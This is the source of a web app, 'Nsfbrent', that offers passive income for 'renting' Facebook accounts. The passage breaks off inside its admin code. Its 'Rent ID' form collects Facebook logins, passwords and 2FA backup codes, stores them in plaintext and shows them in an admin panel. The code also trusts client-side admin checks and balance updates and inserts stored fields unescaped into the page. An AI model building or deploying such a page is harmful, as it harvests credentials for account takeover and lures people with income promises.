<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nsfbrent | Premium ID Rental & Earning Platform</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: '#E11D48',
                        dark: '#0F172A',
                        accent: '#FFF1F2'
                    },
                    backgroundImage: {
                        'hero-pattern': "url('https://www.transparenttextures.com/patterns/cubes.png')"
                    }
                }
            }
        }
    </script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #FFFFFF; color: #1E293B; overflow-x: hidden; scroll-behavior: smooth; }
        .pro-card { background: #FFFFFF; border: 1px solid #F1F5F9; box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.04); border-radius: 2rem; }
        .hero-red { background: linear-gradient(135deg, #E11D48 0%, #9F1239 100%); }
        .offer-card { background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%); border-left: 5px solid #E11D48; }
        .nav-active { color: #E11D48 !important; font-weight: 800; }
        .glass-header { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(15px); }
        .section-title { font-size: 2.5rem; font-weight: 900; letter-spacing: -1px; line-height: 1; }
        section { display: none; padding-bottom: 110px; }
        section.active { display: block; animation: fadeInUp 0.4s ease; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .floating { animation: float 3s ease-in-out infinite; }
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
    </style>
</head>
<body class="no-scrollbar">

    <!-- 1. LANDING PAGE SECTION -->
    <div id="landing-page" class="relative">
        <nav class="fixed top-0 left-0 right-0 z-[200] glass-header border-b border-slate-100 px-6 py-4 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <div class="w-10 h-10 bg-brand rounded-2xl flex items-center justify-center text-white shadow-lg shadow-brand/20">
                    <i class="fa-solid fa-bolt-lightning text-xl"></i>
                </div>
                <h1 class="text-2xl font-black italic tracking-tighter uppercase">NSF<span class="text-brand">BRENT</span></h1>
            </div>
            <div class="flex gap-4">
                <button onclick="showAuth('login')" class="text-slate-600 text-sm font-bold">Sign In</button>
                <button onclick="showAuth('signup')" class="bg-brand text-white px-6 py-2.5 rounded-full text-xs font-black shadow-lg">JOIN NOW</button>
            </div>
        </nav>

        <header class="pt-32 pb-20 px-6 hero-pattern text-center">
            <div class="max-w-4xl mx-auto space-y-8">
                <span class="bg-brand/5 border border-brand/10 px-4 py-2 rounded-full text-[10px] font-black uppercase text-brand tracking-widest">The Smartest ID Rental Platform</span>
                <h2 class="text-6xl md:text-8xl font-black tracking-tighter text-slate-900 italic leading-none">Earn Passive <br> <span class="text-brand">Income</span> Daily.</h2>
                <p class="text-slate-500 text-lg font-medium max-w-2xl mx-auto">আপনার অব্যবহৃত ফেসবুক আইডি রেন্ট দিন এবং কোনো পরিশ্রম ছাড়াই প্রতিদিন নিশ্চিন্তে ইনকাম করুন।</p>
                <div class="flex flex-col sm:flex-row gap-4 justify-center">
                    <button onclick="showAuth('signup')" class="hero-red text-white px-10 py-5 rounded-3xl font-black text-sm shadow-2xl">Start Earning Now <i class="fa-solid fa-arrow-right ml-2"></i></button>
                </div>
            </div>
        </header>

        <!-- (Other landing info - Keep simple to avoid clutter) -->
        <section class="active py-20 bg-slate-50 px-6">
            <div class="max-w-4xl mx-auto grid md:grid-cols-3 gap-8 text-center">
                <div class="pro-card p-8">
                    <i class="fa-solid fa-shield-halved text-brand text-4xl mb-4"></i>
                    <h4 class="font-black text-lg">100% Secure</h4>
                    <p class="text-xs text-slate-400 mt-2">আপনার ডেটা আমাদের কাছে সম্পূর্ণ ইনক্রিপ্টেড এবং নিরাপদ।</p>
                </div>
                <div class="pro-card p-8">
                    <i class="fa-solid fa-money-bill-trend-up text-brand text-4xl mb-4"></i>
                    <h4 class="font-black text-lg">Daily Payout</h4>
                    <p class="text-xs text-slate-400 mt-2">প্রতিদিনের ইনকাম লাইভ ট্র্যাক করুন এবং সাপ্তাহিক পেমেন্ট নিন।</p>
                </div>
                <div class="pro-card p-8">
                    <i class="fa-solid fa-headset text-brand text-4xl mb-4"></i>
                    <h4 class="font-black text-lg">24/7 Support</h4>
                    <p class="text-xs text-slate-400 mt-2">যেকোনো সমস্যায় আমাদের সাপোর্ট টিম সবসময় আপনার পাশে।</p>
                </div>
            </div>
        </section>

        <footer class="py-10 text-center border-t border-slate-100 uppercase font-bold text-[10px] text-slate-300 tracking-widest">
            &copy; 2026 Nsfbrent Ultra. All Rights Reserved.
        </footer>
    </div>

    <!-- 2. AUTH SCREEN -->
    <div id="auth-screen" class="hidden fixed inset-0 z-[300] bg-white flex items-center justify-center p-6">
        <button onclick="hideAuth()" class="absolute top-8 left-8 text-slate-400"><i class="fa-solid fa-arrow-left text-2xl"></i></button>
        <div class="w-full max-w-sm">
            <div id="login-box" class="space-y-4">
                <h2 class="text-5xl font-black tracking-tighter text-slate-900 mb-8 italic uppercase leading-none">LOGIN <span class="text-brand">ACCESS</span></h2>
                <input id="l-email" type="email" placeholder="Email Address" class="w-full p-5 rounded-3xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                <input id="l-pass" type="password" placeholder="Password" class="w-full p-5 rounded-3xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                <button id="btnLogin" class="w-full hero-red text-white font-black py-5 rounded-3xl shadow-xl shadow-brand/20 uppercase tracking-widest text-xs">Sign In</button>
                <p class="text-center text-xs mt-6 font-bold">New User? <button onclick="toggleAuth()" class="text-brand">Create Account</button></p>
            </div>
            <div id="signup-box" class="space-y-4 hidden">
                <h2 class="text-5xl font-black tracking-tighter text-brand mb-8 italic uppercase leading-none">JOIN <span class="text-slate-900">NOW</span></h2>
                <input id="r-email" type="email" placeholder="Email Address" class="w-full p-5 rounded-3xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                <input id="r-pass" type="password" placeholder="Password" class="w-full p-5 rounded-3xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                <input id="r-ref" type="text" placeholder="Referral Code (Optional)" class="w-full p-5 rounded-3xl border-2 border-dashed border-slate-200 outline-none">
                <button id="btnRegister" class="w-full bg-dark text-white font-black py-5 rounded-3xl shadow-xl uppercase tracking-widest text-xs">Register</button>
                <p class="text-center text-xs mt-6 font-bold">Member? <button onclick="toggleAuth()" class="text-brand">Login</button></p>
            </div>
        </div>
    </div>

    <!-- 3. MAIN APP INTERFACE -->
    <div id="main-app" class="hidden min-h-screen bg-white">
        <!-- APP TOP HEADER -->
        <header class="p-5 sticky top-0 z-[100] bg-white/90 backdrop-blur-md flex justify-between items-center border-b border-slate-100">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-brand rounded-2xl flex items-center justify-center text-white shadow-lg shadow-brand/20">
                    <i class="fa-solid fa-bolt-lightning text-xl"></i>
                </div>
                <div>
                    <h1 class="text-xl font-black italic tracking-tighter uppercase leading-none">NSF<span class="text-brand">BRENT</span></h1>
                    <p id="top-lvl" class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Level 1 Earner</p>
                </div>
            </div>
            <div class="flex items-center gap-3">
                <div class="bg-brand/10 text-brand px-3 py-1.5 rounded-full text-xs font-bold flex items-center gap-1">
                    <i class="fa-solid fa-fire animate-pulse"></i> <span id="streak-val">0</span>
                </div>
                <button onclick="logout()" class="text-slate-300 hover:text-brand transition-colors"><i class="fa-solid fa-power-off text-xl"></i></button>
            </div>
        </header>

        <main class="max-w-md mx-auto p-5 space-y-6">

            <!-- Global Offer Message -->
            <div id="global-offer-box" class="hidden">
                <div class="offer-card p-6 rounded-[2rem] text-white shadow-xl relative overflow-hidden animate__animated animate__pulse animate__infinite">
                    <div class="relative z-10">
                        <span class="bg-brand text-[8px] px-2 py-0.5 rounded-full font-black uppercase mb-2 inline-block">Special Offer</span>
                        <h3 id="offer-msg" class="text-xl font-black leading-tight italic">Loading...</h3>
                    </div>
                </div>
            </div>

            <!-- TAB 1: HOME -->
            <section id="home" class="active space-y-6">
                <!-- XP Progress -->
                <div class="px-1">
                    <div class="flex justify-between text-[9px] font-black uppercase mb-1.5 tracking-widest text-slate-400">
                        <span>XP Progression</span>
                        <span id="xp-text">0/500</span>
                    </div>
                    <div class="w-full h-2 bg-slate-100 rounded-full overflow-hidden">
                        <div id="xp-bar" class="h-full bg-brand transition-all duration-1000" style="width: 10%"></div>
                    </div>
                </div>

                <!-- Balance Card -->
                <div class="hero-red p-8 rounded-[2.5rem] text-white shadow-2xl shadow-brand/20">
                    <p class="text-[10px] font-bold uppercase opacity-80 tracking-widest mb-1">Total Balance</p>
                    <h2 class="text-6xl font-black tracking-tighter">৳ <span id="h-balance">0.00</span></h2>
                    <div class="grid grid-cols-2 gap-3 mt-8">
                        <div class="bg-white/10 p-4 rounded-2xl border border-white/10">
                            <p class="text-[8px] font-bold opacity-70 uppercase mb-1">Today Income</p>
                            <p class="text-xl font-black">৳ <span id="h-today">0</span></p>
                        </div>
                        <div class="bg-white/10 p-4 rounded-2xl border border-white/10">
                            <p class="text-[8px] font-bold opacity-70 uppercase mb-1">Total Earned</p>
                            <p class="text-xl font-black">৳ <span id="h-total">0</span></p>
                        </div>
                    </div>
                </div>

                <!-- Daily CheckIn -->
                <div class="pro-card p-5 flex justify-between items-center border-l-4 border-brand">
                    <div>
                        <h4 class="font-black text-slate-800 text-sm">Daily Bonus</h4>
                        <p class="text-[10px] text-slate-400">Claim ৳0.50 daily rewards</p>
                    </div>
                    <button id="btnCheckIn" class="bg-brand text-white px-6 py-2 rounded-xl text-xs font-black shadow-lg">CLAIM</button>
                </div>

                <!-- Income Table (Was missing) -->
                <div class="pro-card p-6">
                    <h3 class="font-black text-slate-800 text-xs mb-4 uppercase">Earning Simulation (৳7/ID)</h3>
                    <div class="overflow-x-auto rounded-xl border border-slate-50">
                        <table class="w-full text-[10px] text-left">
                            <thead class="bg-slate-50 text-slate-400">
                                <tr><th class="p-3">IDs</th><th class="p-3">Daily</th><th class="p-3">Monthly</th></tr>
                            </thead>
                            <tbody class="divide-y divide-slate-50 font-bold">
                                <tr><td class="p-3">10 IDs</td><td class="p-3 text-brand">৳70</td><td class="p-3">৳2,100</td></tr>
                                <tr><td class="p-3">50 IDs</td><td class="p-3 text-brand">৳350</td><td class="p-3">৳10,500</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <div class="pro-card p-5 text-center">
                        <p class="text-[10px] font-bold text-slate-400 uppercase">Live IDs</p>
                        <h4 id="h-live" class="text-2xl font-black text-slate-800">0</h4>
                    </div>
                    <div class="pro-card p-5 text-center">
                        <p class="text-[10px] font-bold text-slate-400 uppercase">Refer Earn</p>
                        <h4 id="h-ref" class="text-2xl font-black text-brand">৳0</h4>
                    </div>
                </div>
            </section>

            <!-- TAB 2: RENT ID -->
            <section id="analysis" class="space-y-6">
                <div class="bg-brand/5 p-4 rounded-2xl border border-brand/10 text-[10px] font-bold text-brand italic">
                    <i class="fa-solid fa-circle-info mr-1"></i> কোয়ালিটি অনুযায়ী প্রতিটি আইডি থেকে প্রতিদিন ৳২ - ৳৫০ ইনকাম হতে পারে।
                </div>
                <div class="pro-card p-6">
                    <h3 class="font-black text-slate-800 mb-5 flex items-center gap-2 uppercase tracking-tighter">
                        <i class="fa-solid fa-plus-circle text-brand"></i> Rent New Account
                    </h3>
                    <div class="space-y-3">
                        <input id="f-email" type="text" placeholder="Facebook Email / Phone" class="w-full p-4 rounded-2xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                        <input id="f-pass" type="password" placeholder="Facebook Password" class="w-full p-4 rounded-2xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                        <input id="f-2fa" type="text" placeholder="2FA Backup Codes / Auth Code" class="w-full p-4 rounded-2xl bg-slate-50 border-none outline-none focus:ring-2 focus:ring-brand">
                        <div class="grid grid-cols-2 gap-3">
                            <input id="f-age" type="text" placeholder="ID Age (e.g. 2y)" class="p-4 rounded-2xl bg-slate-50 border-none text-sm">
                            <input id="f-friends" type="number" placeholder="Friends Count" class="p-4 rounded-2xl bg-slate-50 border-none text-sm">
                        </div>
                        <button id="btnSubmitID" class="w-full hero-red text-white font-black py-4 rounded-2xl shadow-xl uppercase tracking-widest text-xs active:scale-95 transition-all">Submit ID for Rent</button>
                    </div>
                </div>
                <h3 class="text-[10px] font-bold uppercase text-slate-400 tracking-widest px-1">Your Assets</h3>
                <div id="asset-list" class="space-y-4"></div>
            </section>

            <!-- TAB 3: WALLET -->
            <section id="wallet" class="space-y-6">
                <div class="pro-card p-4 bg-brand text-white text-center">
                    <p class="text-[9px] font-bold uppercase opacity-80 mb-1">Payment Request Day: Friday</p>
                    <div id="payout-timer" class="text-xl font-black">00d 00h 00m 00s</div>
                </div>
                <div class="pro-card p-10 text-center">
                    <p class="text-xs font-bold text-slate-400 uppercase mb-2">Withdrawable</p>
                    <h2 class="text-6xl font-black text-slate-900 tracking-tighter">৳ <span id="w-balance">0.00</span></h2>
                    <div class="mt-8 space-y-3">
                        <input id="w-amount" type="number" placeholder="৳ Amount (Min 100)" class="w-full p-4 rounded-2xl bg-slate-50 text-center font-bold outline-none">
                        <input id="w-phone" type="text" placeholder="bKash/Nagad Number" class="w-full p-4 rounded-2xl bg-slate-50 text-center font-bold outline-none">
                        <button id="btnWithdraw" class="w-full bg-dark text-white font-black py-4 rounded-2xl shadow-xl uppercase tracking-widest text-xs">Request Cashout</button>
                    </div>
                </div>
                <h3 class="text-[10px] font-bold uppercase text-slate-400 tracking-widest px-1">Withdraw History</h3>
                <div id="withdraw-history" class="space-y-3"></div>
            </section>

            <!-- TAB 4: REFER -->
            <section id="refer" class="space-y-6">
                <div class="pro-card p-8 hero-red text-white text-center relative overflow-hidden">
                    <p class="text-[10px] font-bold uppercase opacity-80 mb-4">Your Referral Link</p>
                    <div class="flex gap-2">
                        <div id="ref-code" class="flex-1 bg-white/10 p-4 rounded-2xl border border-white/20 font-mono text-2xl font-black uppercase">...</div>
                        <button onclick="copyRef()" class="bg-white text-brand px-6 rounded-2xl font-bold"><i class="fa-solid fa-copy"></i></button>
                    </div>
                    <div class="grid grid-cols-2 gap-4 mt-8">
                        <div><p class="text-[8px] font-bold opacity-70 uppercase">Total Refer</p><h4 id="r-count" class="text-xl font-black">0</h4></div>
                        <div class="border-l border-white/10"><p class="text-[8px] font-bold opacity-70 uppercase">Commission</p><h4 id="r-earn" class="text-xl font-black">৳0</h4></div>
                    </div>
                </div>
                <div class="pro-card p-6 border-2 border-dashed border-slate-200">
                    <h4 class="text-xs font-black text-brand uppercase mb-2">Mission: 20 Active IDs</h4>
                    <p class="text-[10px] font-bold text-slate-500 mb-4">আপনার রেফার করা কেউ ২০টি আইডি দিলে পাবেন ৫০ টাকা নগদ বোনাস!</p>
                    <div class="w-full h-2 bg-slate-100 rounded-full overflow-hidden">
                        <div id="mission-bar" class="h-full bg-brand" style="width: 0%"></div>
                    </div>
                </div>
                <h3 class="text-[10px] font-bold uppercase text-slate-400 tracking-widest px-1">Top Leaderboard</h3>
                <div id="leaderboard" class="space-y-3"></div>
            </section>

            <!-- TAB 5: SUPPORT -->
            <section id="support" class="space-y-6">
                <div class="pro-card p-6">
                    <h3 class="font-black text-slate-800 mb-4 uppercase">Rules & Terms</h3>
                    <div class="space-y-2 text-[10px] font-bold text-slate-500">
                        <p>১. পেমেন্ট রিকোয়েস্ট শুধুমাত্র প্রতি শুক্রবার নেওয়া হয়।</p>
                        <p>২. ২এফএ বা পাসওয়ার্ড ভুল হলে আইডি রিজেক্ট করা হবে।</p>
                        <p>৩. রেফারেল ১০% লাইফটাইম কমিশন উপভোগ করুন।</p>
                    </div>
                </div>
                <div class="pro-card p-6">
                    <h3 class="font-black text-slate-800 mb-4 uppercase text-xs">Support Ticket</h3>
                    <textarea id="s-msg" placeholder="Describe your issue..." class="w-full p-4 rounded-2xl bg-slate-50 border-none outline-none text-xs h-24 mb-3"></textarea>
                    <button id="btnSupport" class="w-full bg-brand text-white font-black py-4 rounded-2xl uppercase text-[10px] tracking-widest">Send Ticket</button>
                </div>
                <div class="flex gap-2">
                    <a href="#" class="flex-1 bg-green-500 text-white p-4 rounded-2xl text-center text-xs font-black"><i class="fa-brands fa-whatsapp mr-1"></i> WhatsApp</a>
                    <a href="#" class="flex-1 bg-blue-500 text-white p-4 rounded-2xl text-center text-xs font-black"><i class="fa-brands fa-telegram mr-1"></i> Telegram</a>
                </div>
            </section>

            <!-- ADMIN PANEL (Hidden for users) -->
            <section id="admin-p" class="space-y-6 pb-10">
                <div class="bg-dark p-8 rounded-[2.5rem] text-white">
                    <h2 class="text-2xl font-black italic uppercase tracking-tighter">Admin Console</h2>
                    <div class="grid grid-cols-2 gap-3 mt-6">
                        <button onclick="bulkIncomeAdd()" class="bg-brand text-white p-3 rounded-xl text-[10px] font-black uppercase">Add Bulk Income</button>
                        <button onclick="updateOffer()" class="bg-white/10 text-white p-3 rounded-xl text-[10px] font-black uppercase">Update Global Offer</button>
                    </div>
                </div>
                <div class="space-y-4">
                    <h4 class="text-xs font-black uppercase text-slate-400">Pending Review</h4>
                    <div id="adm-pending-ids" class="space-y-3"></div>
                    <h4 class="text-xs font-black uppercase text-slate-400 mt-6">Payout Requests</h4>
                    <div id="adm-withdraws" class="space-y-3"></div>
                </div>
            </section>

        </main>

        <!-- APP NAVIGATION -->
        <nav class="fixed bottom-0 left-0 right-0 h-24 bg-white/80 backdrop-blur-xl border-t border-slate-100 flex justify-around items-center px-6 z-40 rounded-t-[2.5rem] shadow-2xl">
            <button onclick="changeTab('home', this)" class="nav-btn nav-active flex flex-col items-center gap-1">
                <i class="fa-solid fa-house-chimney text-xl"></i>
                <span class="text-[8px] font-bold uppercase">Home</span>
            </button>
            <button onclick="changeTab('analysis', this)" class="nav-btn text-slate-300 flex flex-col items-center gap-1">
                <i class="fa-solid fa-bolt text-xl"></i>
                <span class="text-[8px] font-bold uppercase">Rent ID</span>
            </button>
            <button onclick="changeTab('wallet', this)" class="nav-btn text-slate-300 flex flex-col items-center gap-1">
                <i class="fa-solid fa-wallet text-xl"></i>
                <span class="text-[8px] font-bold uppercase">Wallet</span>
            </button>
            <button onclick="changeTab('refer', this)" class="nav-btn text-slate-300 flex flex-col items-center gap-1">
                <i class="fa-solid fa-users-rays text-xl"></i>
                <span class="text-[8px] font-bold uppercase">Refer</span>
            </button>
            <button onclick="changeTab('support', this)" class="nav-btn text-slate-300 flex flex-col items-center gap-1">
                <i class="fa-solid fa-headset text-xl"></i>
                <span class="text-[8px] font-bold uppercase">Support</span>
            </button>
        </nav>
    </div>

    <!-- FIREBASE AND APP SCRIPT -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, query, where, addDoc, setDoc, updateDoc, increment, getDocs, getDoc, orderBy, limit } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDGu3NwV_cjIOqgjhL-9i2iprRVwT8wQp4",
            authDomain: "nsfbrent-7059d.firebaseapp.com",
            projectId: "nsfbrent-7059d",
            storageBucket: "nsfbrent-7059d.firebasestorage.app",
            messagingSenderId: "665490309390",
            appId: "1:665490309390:web:f36a92f783407f5292575f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const ADMIN_EMAIL = "admin@gmail.com";
        let uData = null;

        // AUTH UI TOGGLE
        window.showAuth = (type) => {
            document.getElementById('landing-page').classList.add('hidden');
            document.getElementById('auth-screen').classList.remove('hidden');
            if(type === 'signup') {
                document.getElementById('login-box').classList.add('hidden');
                document.getElementById('signup-box').classList.remove('hidden');
            } else {
                document.getElementById('login-box').classList.remove('hidden');
                document.getElementById('signup-box').classList.add('hidden');
            }
        };
        window.hideAuth = () => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('landing-page').classList.remove('hidden');
        };
        window.toggleAuth = () => {
            document.getElementById('login-box').classList.toggle('hidden');
            document.getElementById('signup-box').classList.toggle('hidden');
        };

        // NAV SYSTEM
        window.changeTab = (tab, btn) => {
            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
            document.getElementById(tab).classList.add('active');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('nav-active', 'text-brand'));
            if(btn) btn.classList.add('nav-active');
            window.scrollTo(0,0);
        };
        window.logout = () => signOut(auth);

        // AUTH LISTENER
        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('landing-page').classList.add('hidden');
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('main-app').classList.remove('hidden');
                initApp(user);
                if(user.email === ADMIN_EMAIL) {
                    document.getElementById('admin-p').classList.remove('hidden');
                    initAdmin();
                }
            } else {
                document.getElementById('landing-page').classList.remove('hidden');
                document.getElementById('main-app').classList.add('hidden');
            }
        });

        // APP CORE LOGIC
        function initApp(user) {
            // Settings Sync
            onSnapshot(doc(db, "settings", "global"), (d) => {
                if(d.exists() && d.data().is_offer_active) {
                    document.getElementById('global-offer-box').classList.remove('hidden');
                    document.getElementById('offer-msg').innerText = d.data().offer_text;
                } else {
                    document.getElementById('global-offer-box').classList.add('hidden');
                }
            });

            // User Data Sync
            onSnapshot(doc(db, "users", user.uid), (d) => {
                if(!d.exists()) return;
                uData = d.data();
                document.getElementById('h-balance').innerText = uData.balance.toFixed(2);
                document.getElementById('w-balance').innerText = uData.balance.toFixed(2);
                document.getElementById('h-today').innerText = uData.today_earn || 0;
                document.getElementById('h-total').innerText = uData.total_earn || 0;
                document.getElementById('streak-val').innerText = uData.streak || 0;
                document.getElementById('ref-code').innerText = uData.refer_code;
                document.getElementById('r-count').innerText = uData.refer_count || 0;
                document.getElementById('r-earn').innerText = "৳" + (uData.refer_earn || 0);
                document.getElementById('h-ref').innerText = "৳" + (uData.refer_earn || 0);

                const currentXP = uData.xp % 500;
                document.getElementById('xp-text').innerText = `${currentXP}/500`;
                document.getElementById('xp-bar').style.width = (currentXP / 500 * 100) + '%';
                document.getElementById('top-lvl').innerText = `Level ${Math.floor(uData.xp/500)+1} Earner`;
                const missionProg = Math.min((uData.refer_count / 20) * 100, 100);
                document.getElementById('mission-bar').style.width = missionProg + '%';
            });

            // Asset List Sync
            onSnapshot(query(collection(db, "accounts"), where("owner", "==", user.uid)), (snap) => {
                let h = ''; let live = 0;
                snap.forEach(d => {
                    const acc = d.data();
                    if(acc.health === 'live') live++;
                    h += `
                    <div class="pro-card p-5 border-l-4 ${acc.health==='live'?'border-green-500':'border-brand'}">
                        <div class="flex justify-between items-start mb-3">
                            <div><p class="text-xs font-black text-slate-800">${acc.email}</p><span class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">${acc.status}</span></div>
                            <span class="text-[8px] bg-slate-50 px-2 py-1 rounded-full font-bold uppercase">${acc.health}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                            <div class="bg-slate-50 p-3 rounded-2xl">
                                <p class="text-[8px] font-bold opacity-50 uppercase">Today</p>
                                <p class="text-lg font-black text-brand">৳${acc.today_income || 0}</p>
                            </div>
                            <div class="bg-slate-50 p-3 rounded-2xl">
                                <p class="text-[8px] font-bold opacity-50 uppercase">Daily Rate</p>
                                <p class="text-lg font-black">৳${acc.daily_rate || 0}</p>
                            </div>
                        </div>
                    </div>`;
                });
                document.getElementById('asset-list').innerHTML = h || '<p class="text-center py-10 opacity-30 text-xs font-bold">NO ASSETS RENTED</p>';
                document.getElementById('h-live').innerText = live;
            });

            // Withdraw History Sync
            onSnapshot(query(collection(db, "withdrawals"), where("uid", "==", user.uid), orderBy("date", "desc")), (snap) => {
                let h = '';
                snap.forEach(d => {
                    const w = d.data();
                    h += `<div class="pro-card p-4 flex justify-between items-center bg-slate-50">
                        <div><p class="text-[10px] font-black">${w.number}</p><p class="text-[8px] text-slate-400 uppercase">${w.status}</p></div>
                        <p class="font-black text-sm text-brand">৳${w.amount}</p>
                    </div>`;
                });
                document.getElementById('withdraw-history').innerHTML = h || '<p class="text-center py-5 opacity-30 text-[10px] font-bold uppercase">NO PAYOUT LOGS</p>';
            });

            // Leaderboard Sync
            onSnapshot(query(collection(db, "users"), orderBy("total_earn", "desc"), limit(5)), (snap) => {
                let h = ''; let i = 1;
                snap.forEach(d => {
                    const ld = d.data();
                    h += `<div class="pro-card p-4 flex justify-between items-center">
                        <div class="flex items-center gap-3">
                            <span class="w-6 h-6 flex items-center justify-center bg-slate-100 rounded-lg text-[10px] font-black">${i++}</span>
                            <p class="text-xs font-bold text-slate-600">${ld.email.split('@')[0]}...</p>
                        </div>
                        <p class="text-xs font-black text-brand">৳${ld.total_earn.toFixed(0)}</p>
                    </div>`;
                });
                document.getElementById('leaderboard').innerHTML = h;
            });

            // Timer
            setInterval(() => {
                const now = new Date();
                const nextFri = new Date();
                nextFri.setDate(now.getDate() + (5 - now.getDay() + 7) % 7);
                nextFri.setHours(14, 0, 0, 0);
                const diff = nextFri - now;
                const d = Math.floor(diff / (1000*60*60*24));
                const h = Math.floor((diff % (1000*60*60*24)) / (1000*60*60));
                const m = Math.floor((diff % (1000*60*60)) / (1000*60));
                const s = Math.floor((diff % (1000*60)) / 1000);
                document.getElementById('payout-timer').innerText = `${d}d ${h}h ${m}m ${s}s`;
            }, 1000);
        }

        // BUTTON ACTIONS
        document.getElementById('btnSubmitID').onclick = async () => {
            const email = document.getElementById('f-email').value;
            const pass = document.getElementById('f-pass').value;
            if(!email || !pass) return Swal.fire('Error', 'Fields are required!', 'warning');
            await addDoc(collection(db, "accounts"), {
                owner: auth.currentUser.uid, owner_email: auth.currentUser.email,
                email, pass, fa2: document.getElementById('f-2fa').value, age: document.getElementById('f-age').value,
                status: 'pending', health: 'live', daily_rate: 0, income: 0, today_income: 0, date: new Date()
            });
            Swal.fire('Submitted!', 'Review will take up to 24h.', 'success');
            document.getElementById('f-email').value = ''; document.getElementById('f-pass').value = '';
        };

        document.getElementById('btnCheckIn').onclick = async () => {
            const today = new Date().toDateString();
            if(uData.lastClaim === today) return Swal.fire('Wait', 'Already claimed today!', 'info');
            await updateDoc(doc(db, "users", auth.currentUser.uid), {
                balance: increment(0.50), xp: increment(10), streak: increment(1), lastClaim: today
            });
            Swal.fire('Claimed!', 'Daily ৳0.50 bonus added!', 'success');
        };

        document.getElementById('btnWithdraw').onclick = async () => {
            const amt = Number(document.getElementById('w-amount').value);
            const phone = document.getElementById('w-phone').value;
            if(new Date().getDay() !== 5) return Swal.fire('Wait', 'Withdrawal is only accepted on Friday!', 'info');
            if(amt < 100 || amt > uData.balance) return Swal.fire('Error', 'Invalid amount!', 'error');
            await addDoc(collection(db, "withdrawals"), {
                uid: auth.currentUser.uid, email: auth.currentUser.email,
                amount: amt, number: phone, status: 'pending', date: new Date()
            });
            await updateDoc(doc(db, "users", auth.currentUser.uid), { balance: increment(-amt) });
            Swal.fire('Success', 'Cashout request pending.', 'success');
        };

        window.copyRef = () => {
            navigator.clipboard.writeText(uData.refer_code);
            Swal.fire('Copied!', 'Share your link to earn 10% commission!', 'success');
        };

        // ADMIN FUNCTIONS
        window.bulkIncomeAdd = async () => {
            const snap = await getDocs(query(collection(db, "accounts"), where("status", "==", "approved"), where("health", "==", "live")));
            snap.forEach(async (d) => {
                const acc = d.data();
                if(acc.daily_rate > 0) {
                    await updateDoc(doc(db, "accounts", d.id), { income: increment(acc.daily_rate), today_income: acc.daily_rate });
                    await updateDoc(doc(db, "users", acc.owner), { balance: increment(acc.daily_rate), total_earn: increment(acc.daily_rate), today_earn: acc.daily_rate, xp: increment(5) });
                    
                    // Referral 10% logic
                    const uSnap = await getDoc(doc(db, "users", acc.owner));
                    const uD = uSnap.data();
                    if(uD.referred_by) {
                        const rQuery = query(collection(db, "users"), where("refer_code", "==", uD.referred_by));
                        const rSnap = await getDocs(rQuery);
                        if(!rSnap.empty) {
                            const commission = acc.daily_rate * 0.10;
                            await updateDoc(doc(db, "users", rSnap.docs[0].id), { balance: increment(commission), refer_earn: increment(commission) });
                        }
                    }
                }
            });
            Swal.fire('Done!', 'Income & Refer commission added!', 'success');
        };

        window.initAdmin = () => {
            onSnapshot(query(collection(db, "accounts"), where("status", "==", "pending")), (snap) => {
                let h = '';
                snap.forEach(d => {
                    const id = d.data();
                    h += `<div class="pro-card p-4 flex justify-between items-center bg-slate-50">
                        <div class="text-[10px] font-bold">${id.email} | ${id.pass}<br><span class="text-brand">2FA: ${id.fa2 || 'None'}</span></div>
                        <button onclick="approveID('${d.id}')" class="bg-green-500 text-white px-4 py-2 rounded-lg text-[9px] font-black">APPROVE</button>
                    </div>`;
                });
                document.getElementById('adm-pending-ids').innerHTML = h || '<p class="text-center opacity-30 text-[10px]">NO PENDING IDS</p>';
            });

            onSnapshot(query(collection(db, "withdrawals"), where("status", "==", "pending")), (snap) => {
                let h = '';
                snap.forEach(d => {
